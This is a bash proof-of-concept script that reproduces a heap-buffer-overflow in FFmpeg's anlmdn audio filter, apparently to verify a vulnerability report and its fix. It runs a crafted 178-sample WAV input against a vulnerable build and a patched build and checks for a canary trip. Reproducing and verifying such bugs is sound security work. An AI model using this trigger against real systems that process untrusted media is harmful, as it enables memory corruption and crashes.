#!/usr/bin/env bash
# FfmpegOverrun — heap-buffer-overflow in FFmpeg's `anlmdn` audio filter (CWE-787).
#
# The vulnerable loop in libavfilter/af_anlmdn.c iterates `i` from S to H+S and
# writes `dst[i - S]`, but the output frame is only allocated for `in->nb_samples`
# samples. When the final audio frame is shorter than H (i.e. the stream length is
# not a multiple of H), the loop writes past the heap buffer.
#
# Both binaries are REAL FFmpeg 9.0.2 (latest release), compiled from source with
# musl-gcc, with the allocator (av_malloc) instrumented with a canary redzone so
# the out-of-bounds WRITE is detected deterministically (ASAN is unavailable).
#   - ffmpeg-vuln : unmodified n9.0.2 (vulnerable loop `i < H + S`)
#   - ffmpeg-fixed: same source with the upstream fix (`i < in->nb_samples + S`)
#
# 177 samples == 1*H -> clean.  178 samples == H+1 -> final frame of 1 sample,
# which overflows by (H-1)*4 = 704 bytes past a 1-sample (4-byte) float buffer.
set -u
cd "$(dirname "$0")"

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

CLEAN="$WORK/clean177.wav"
TRIG="$WORK/trigger178.wav"
python3 gen_wav.py "$CLEAN" 177
python3 gen_wav.py "$TRIG" 178

VULN=./ffmpeg-vuln
FIXED=./ffmpeg-fixed
ARGS=(-y -hide_banner -loglevel error -i)

# Rebuild the binaries from source if absent (needs network + a C compiler).
if [ ! -x "$VULN" ] || [ ! -x "$FIXED" ]; then
  echo "[*] binaries missing — building from FFmpeg n9.0.2 source via build.sh"
  bash build.sh || { echo "build failed"; exit 1; }
fi

echo
echo "=== [1/3] CONTROL — vulnerable binary, clean 177-sample input (no overflow) ==="
"$VULN" "${ARGS[@]}" "$CLEAN" -af anlmdn -f wav /dev/null >/dev/null 2>"$WORK/clean.log"
CC=$?
echo "    [vuln binary, 177 samples -> exit $CC (expect 0)]"
cat "$WORK/clean.log"

echo
echo "=== [2/3] EXPLOIT — vulnerable binary, 178-sample input (short final frame) ==="
"$VULN" "${ARGS[@]}" "$TRIG" -af anlmdn -f wav /dev/null >/dev/null 2>"$WORK/trig.log"
TC=$?
echo "    [vuln binary, 178 samples -> exit $TC (expect 134 = SIGABRT)]"
cat "$WORK/trig.log"

echo
echo "=== [3/3] FIXED binary, same 178-sample input (must NOT trip the canary) ==="
"$FIXED" "${ARGS[@]}" "$TRIG" -af anlmdn -f wav /dev/null >/dev/null 2>"$WORK/fixed.log"
FC=$?
echo "    [fixed binary, 178 samples -> exit $FC (expect 0)]"
cat "$WORK/fixed.log"

echo
if grep -q "AIVR-CANARY: HEAP-BUFFER-OVERFLOW" "$WORK/trig.log" && [ "$TC" -ne 0 ] && [ "$FC" -eq 0 ]; then
    echo "FFMPEGOVERRUN-OK: heap-buffer-overflow reproduced (vuln exit=$TC, fixed exit=$FC)"
    exit 0
else
    echo "FFMPEGOVERRUN-FAIL: expected canary trip on vuln + clean fixed run (vuln=$TC fixed=$FC)"
    exit 1
fi
